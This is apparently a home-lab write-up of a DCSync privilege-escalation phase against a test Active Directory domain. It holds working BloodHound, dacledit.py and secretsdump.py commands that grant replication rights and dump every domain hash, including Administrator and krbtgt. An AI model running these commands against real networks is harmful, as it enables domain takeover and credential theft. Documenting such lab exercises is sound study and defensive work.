# Phase 4 — Privilege Escalation via DCSync

## Overview
Using a WriteDACL misconfiguration on the domain object, svc-mssql 
granted itself DCSync replication rights. This allowed the attacker 
to dump all domain password hashes directly from DC01 without 
touching the Domain Controller locally.

## MITRE ATT&CK
| Field | Value |
|---|---|
| Tactic | Privilege Escalation, Defense Evasion, Persistence |
| Technique | T1078.002 — Domain Accounts |
| Sub-technique | T1003.006 — DCSync |

## Environment
| Component | Details |
|---|---|
| Attacker | Kali Linux (10.0.0.99) |
| Target | DC01 — Windows Server 2022 (10.0.0.10) |
| Tools | Impacket dacledit.py, secretsdump.py |
| Entry Point | svc-mssql credentials from Phase 2 |

## Attack Chain
```
Phase 2: Kerberoasting → svc-mssql:Password1
        ↓
Phase 3: Pass-the-Hash → confirmed network access
        ↓
Phase 4: WriteDACL misconfiguration discovered via BloodHound
        ↓
dacledit.py → svc-mssql grants itself DCSync rights
        ↓
secretsdump.py → all domain hashes dumped
        ↓
Administrator hash obtained → Domain fully compromised
```

## Attack Steps

### 1. Discover WriteDACL Misconfiguration via BloodHound
```bash
bloodhound-python -u svc-mssql -p 'Password1' \
-d SOC.local -ns 10.0.0.10 -c ALL
```
Import JSON files → Analyze ACL paths → WriteDACL found on domain object

### 2. Grant DCSync Rights via dacledit.py
```bash
python3 dacledit.py \
-action write \
-rights DCSync \
-principal svc-mssql \
-target-dn "DC=SOC,DC=local" \
-dc-ip 10.0.0.10 \
'SOC.local/svc-mssql:Password1'
```
Result: DACL modified successfully

### 3. Execute DCSync Attack
```bash
python3 secretsdump.py \
SOC.local/svc-mssql:'Password1'@10.0.0.10 \
-just-dc-ntlm
```
Result: All domain hashes dumped including Administrator

## Credentials Obtained
| Account | Type |
|---|---|
| Administrator | Domain Admin |
| krbtgt | Kerberos TGT account |
| All domain users (User1-User20) | Domain users |

